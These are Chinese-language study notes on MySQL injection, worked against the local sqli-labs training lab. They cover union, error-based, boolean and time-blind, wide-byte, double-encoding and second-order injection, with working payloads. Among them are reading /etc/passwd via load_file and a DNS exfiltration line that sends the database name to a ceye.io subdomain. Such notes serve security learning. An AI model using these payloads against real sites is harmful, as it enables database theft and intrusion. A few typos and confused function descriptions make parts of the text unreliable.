### 1.Mysql 注入常用函数

#### 1.查基础信息函数

system user() 系统用户名  

user() 用户名

current_user() 当前用户名

session_user() 连接数据库的用户名

database()  数据库名

version() 或 @@version 数据库版本

@@datadir 数据库路径

@@basedir 数据库安装路径

@@version_compile_os  操作系统

#### 2.计算拼接函数

count() 返回执行结果的数量

concat()  没有分隔符的连接字符串

concat_ws() 含有分隔符的连接字符串

group_concat() 连接一个组的所有字符串，并以逗号分隔每一条数据

ascii()     字符串的ascii码值vim 

ord()   返回字符串第一个字符的ascii码值

mid()  返回一个字符串的一部分   select mid("mysql",1,3);

substr() 返回一个字符串的一部分 select substr('abcdef',2,2)返回bc  

select substr('abcdef',2)返回bcdef

substring()返回一个字符串的一部分 用法和substr一样

length()  返回字符串的长度

left( ) 返回字符串最左边的几个字符 select left("haha",3)

floor() 返回小于或等于x的最大整数 select floor(5.9) 返回 5

rand()  返回0和1之间的一个随机数 select rand()

extractvalue()

 第一个参数XML document 是String 格式 ,为XML对象的名称,文中为DOC

第二个参数： XPath string (XPath格式的字符串) 作用从目标XML中返回包含所查询值的字符串

updatexml() 

第一个参数:XML document 是String 格式 ,为XML对象的名称,文中为DOC

第二个参数： XPath string (XPath格式的字符串) 

第三个参数 : new value, String格式 替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值

if() 判断函数     select if (1<2,user(),version())    1<2成立返回user()结果不成立返回version()结果

char() 返回整数ascii代码字符组成的字符串  select char(115)

strcmp() 比较字符串的内容是否相等相等返回0不相等返回-1 select strcmp("1","2")

ifnull()         select ifnull(12,3) 参数1不为null 返回参数1反之返回参数2

exp()   计算自然指数幂次方

order by 排序函数

select * from users order by  3;   order by排序函数对第三列进行排序   可判断表的列数

#### 3.读写文件函数

load_file 读取本地文件 例: slect load_file('文件路径')

into outfile  写文件  select "哈哈" into outfile "路径"

#### 4.时间延迟函数

sleep() 用法 sleep(3) 延迟执行语句3秒

benchmark() 重复计算多次 用法 benchmark(50000000,1*2) 计算五千万次1\*2 通过函数计算多次不能立即执行完来实现时间延迟

### 2.Mysql运算符

#### 1.算术运算符

		##### 1.算术运算符
	
	+,  -,  *,  / 加减乘除

#### 2.比较运算符

	>, <, =, >=, <= ,!=或<>, is null 大于,小于,等于,大于等于,小于等于

不等于,为空

#### 3.逻辑运算符

  && 或 AND 与

  || 或 OR  或

#### 4.正则函数

regexp 用法 select user() regexp '^roo';

### 3.Mysql核心语法

#### 1.查库

select schema_name from information_schema.schemata;

#### 2.查表

select table_name from information_schema.tables where table_schema=库名

#### 3.查字段

select column_name from information_schema.columns where table_name=表

#### 4.查数据

select 字段名 from 库名.表名;

### 4.Sql注入

#### 1.Docker搭建sqli-labs

apt install docker.io 安装docker

docker search sqli-labs  搜索靶场镜像

docker pull acgpiano/sqli-labs 拉取镜像

docker run -dt --name sqli-labs -p 80:80 acgpiano/sqli-labs  建立容器

以上内容 -dt 代表在后台运行  --name 是随便起个名字 -p 前一个是本地端口后面是docker的端口 由于sqli在镜像中运行在80端口所以把docker的80端口映射到本地的端口

docker stop 暂停容器 docker rm 容器名 删除容器

docker exec -it 容器名 /bin/bash 或 bash  进入容器的终端 exit退出容器

#### 2.union联合查询

sqli-labs第一关

在地址栏输入一个引号: http://127.0.0.1/Less-1/?id=1'会报错

You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

由此可初步判断后台sql语句可能为 select *  from users where id='1' limit 0,1;

我们在地址栏?id=1后面输入字符sql语句都会变成这样:和1都在引号里面:  select * from users where id='1这里是在地址栏?id=1后面输入的字符' limit 0,1;

如果我们在?id=1后面输入一个 ' 号语句就会变成这样 select * from user where id='1' ‘ limit 0,1;此时我们在两个引号中间输入了一个引号,这个引号自动和前面一个组成一对,由于多出一个引号语句会报错所以我们使用mysql注释注释掉后面的语句 select * from user where id='1'  --+' limit 0,1;此时我们输入的字符已经可以在引号之外可以被带入数据库当做命令执行,select * from user where id='1'; 

union联合查询相当于 用union 联合了两个查询语句查询 在mysql中联合查询 union 前后两个查询语句查询的列必须相同,所以我们要知道有多少列所以这里使用排序函数 order by 例如 select * from user order by 3 就是给查询出来数据的第三列排序,如果给没有的列排序就会报错

此时我们可以在地址栏用order by判断列数地址栏输入 http://127.0.0.1/Less-1/?id=1' order by 5--+

给查询语句第5列排序 于是报错显示没有第五列 此时数往下减直到 给第三列排序时页面显示正常所以判断出了有几列.然后可以使用 union 联合查库,

如果两条语句都成功只会显示前面一条的语句执行结果显示在页面上，所以把union之前的语句报错让我们查询的数据显示在页面上 

最后在地址栏输入http://127.0.0.1/Less-1/?id=-1'  union select 1,2,(select schema_name from information_schema.schema.ta;) --+ 查询数据库如果页面上显示不了那么多数据我们可以使用 select group_concat(schema_name) from information_schema.schemata;来把数据来连成一句来显示或使用 limit 一个一个显示然后根据查询到的数据库名进行查表 查字段 最后查数据 还可以使用load_file()来读取主机山的文件 例如 http://127.0.0.1/Less-1/?id=-1'  union select 1,2,(select load_file('/etc/passwd'))--+

#### 3.报错注入

​		1.floor() 函数用法

select count(\*) from information_schema.tables group by concat((select user()),floor(rand(0)\*2)));

rand() 函数返回0到1之间的小数 使用floor(rand(0)*2)让语句返回0或1让count函数统计数量的时候 group by排序出现重复的键进行报错 

​		2. extractvalue() 用法

select extractvalue(1,concat(0x7e,(select user()),0x7e)); 

extractvalue() 第一个参数xml文档 第二个参数为xpath语句 此处使用concat是为了让语句返回完整的信息不使用concat查询出来的信息不符合xpath格式的信息会被过滤掉

​		3.updatexml()函数用法

select updatexml(1,concat(0x7e,(select user()),0x7e),1);

updatexml()第一个参数为xml文档 第二个参数为xpath语句第三个为字符串用法和extractvalue()一样

#### 4.布尔盲注

布尔盲注是通过构造语句,来判断数据库信息的正确性,再通过页面的"真" 和 "假"来识别我们的判断是否正确

1.   left(''abcd",2)取左两个字符用法 left(database(),1)='s';

2.   regexp 正则函数    select user() regexp '^r': 

3.   like select user() like 'r%'

4.   sustr()，substring() ascii()函数 ascii(substr((select user()),1,1))=98 

​      substr()和substring(),第一个参数字符串 第二个参数为开始截取位置 第三个参数为截取数量,ascii() 计算字符串的ASCII码值

       5. ord() mid() 函数  ord(mid(select user()),1,1)=114

ord()函数第一个参数为字符串 第二个参数为截取起始位置,第三个参数为截取数量 mid()函数 可以把字符转换为ascii码

#### 5.时间盲注

使用if语句判断执行的sql查询语句的真假来进行时间盲注

sleep(3)  select if(substr((select user()),1,1)="e",0,sleep(3));

​	select if(substr((select user()),1,1)="e",0,benchmark(50000000,1*2));

#### 6.Dns盲注

核心语法 select load_file(concat('\\\\\\\\ ,(select database()),'.mysql.r4ourp.ceye.io\\\\ abc'));

通过查询语句load_file() 带入数据库让数据库对dns平台发起请求来实现dns盲注使用load_flie() 函数进行dns盲注只能用于目标机为windows

#### 7.宽字节注入

编码为 GB2312,GBK,GB18030,BIG5,Shift_JIS这些都是常说的宽字节,实际为两字节

通常进行sql注入的时候为了闭合原有引号会输入一个引号 当输入'的时候会被处理为

\\' 被转义了编码过后会变成 %5C%27

mysql使用GBK编码的时候会认为两个字符为一个汉字这时我们使用 %df 与转移符号\\进行组合成一个汉字 就会绕过转义 与转移字符组成汉字的时候前一个字符的Ascii码必须大于128才能与转义字符组合成汉字 

1.使用utf-8编码方式可避免宽字节注入

2.可设置 character_set_client=binary  使用二进制模式进行数据库连接避免宽字节

#### 8.二次编码注入

当我们在url输入特殊符号的时候 例如 +,=,',等等在http请求的过程中与原有的格式发生冲突从而导致问题所以传输的时候要进行编码

我们进行sql注入的时候输入引号进行闭合就会被转义 \\' 在GBK编码处理编码的过程中出现问题,可构造数据消灭转义字符\\  当我们输入 id=1%2527的时候就会被php自身编码转换成id=1%27 让php语句解码把id=%27转 换为id=1' 于是就绕过了转义

#### 9.二次注入

这里以sqli-labs第24关为例注册个账户名为 admin'#的账户密码为123456此时进数据库查看用户表select * from security.users;这时可以看到用户名为admin的密码为admin   admin'#的密码为123456 这时我们登录进行修改密码为123修改后再查看表发现admin用户的密码被我们修改成了123;

### 5.创建用户并设置只能使用指定DB

1. 创建一个新用户。使用以下命令创建用户，并将 `<username>` 替换为你所需的用户名，`<password>` 替换为密码：

   CREATE USER '<username>'@'localhost' IDENTIFIED BY '<password>';

2. 授予用户访问指定数据库的权限。使用以下命令将 `<database>` 替换为你要限制访问的数据库名称：

   GRANT ALL PRIVILEGES ON `<database>`.* TO '<username>'@'localhost';

3. 刷新配置

​		<span style="color:red">FLUSH PRIVILEGES;</span>

